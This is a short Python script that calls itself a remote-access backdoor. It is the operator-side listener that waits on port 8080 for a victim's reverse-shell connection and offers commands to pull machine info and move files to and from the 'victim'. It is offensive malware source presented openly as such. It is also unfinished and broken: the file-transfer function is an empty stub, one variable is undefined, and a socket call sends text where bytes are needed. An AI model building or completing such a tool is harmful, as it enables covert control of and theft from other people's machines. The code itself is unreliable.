import socket
import os
import threading

local_host = ""
local_port = 8080

banner ="""                               
##############################################                   
(C) Python Remote Access Control - Backdoor !!
    
##############################################
"""

def functions():
    print ("-------------------------------------------")
    print ("\nUse these commands to control victim.\n")
    print ("about   --------> Get info about victim machine")
    print ("download <args>  ---------> Download file from victim machine")
    print ("upload <args>  ---------> Upload file to victim machine")


def transfer_file(conn, command):
    pass

def connect(ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip_address, 8080))
    s.listen()
    print (f"[+] Listening for incoming TCP connection on port {port}")
    conn, addr = s.accept()
    print (f"[+] Got a connection from: {addr}")
    while True:
        command = input("Shell > ")
        if "stop" in command:
            conn.send("terminate")
            conn.close()
            return 1
        elif "upload" in command:
            transfer_file(conn, command)
        elif "download" in command:
            transfer_file(conn, command)

def main():
    while True:
        print (banner)
        cmd = input("> ")
        if cmd == "reverse_shell":
            ip_address = input("> IP address: ")
            connect(ip_address)
        else:
            functions()

if __name__ == "__main__":
    main()